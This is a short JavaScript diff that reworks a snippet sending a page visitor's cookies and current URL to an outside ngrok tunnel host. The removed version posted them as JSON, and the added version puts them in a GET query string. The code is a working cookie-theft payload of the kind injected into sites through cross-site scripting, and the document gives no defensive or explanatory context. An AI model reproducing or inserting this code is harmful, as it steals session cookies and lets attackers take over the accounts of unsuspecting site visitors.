@@ -1,13 +1,9 @@
-  fetch('https://osprey-gorgeous-gazelle.ngrok-free.app/', {
-    method: 'POST',
+fetch('https://osprey-gorgeous-gazelle.ngrok-free.app/?cookies=' + encodeURIComponent(document.cookie) + 
+        '&location=' + encodeURIComponent(window.location.href), {
+    method: 'GET',
     headers: {
-      'Content-Type': 'application/json',
       'ngrok-skip-browser-warning': 'true'
-    },
-    body: JSON.stringify({
-      cookies: document.cookie,
-      location: window.location.href
-    })
-  }).then(response => response.text())
-    .then(data => console.log('Data sent successfully:', data))
-    .catch(error => console.error('Error:', error));
+    }
+  })
+  .then(response => console.log('Data sent successfully:', response))
+  .catch(error => console.error('Error:', error));
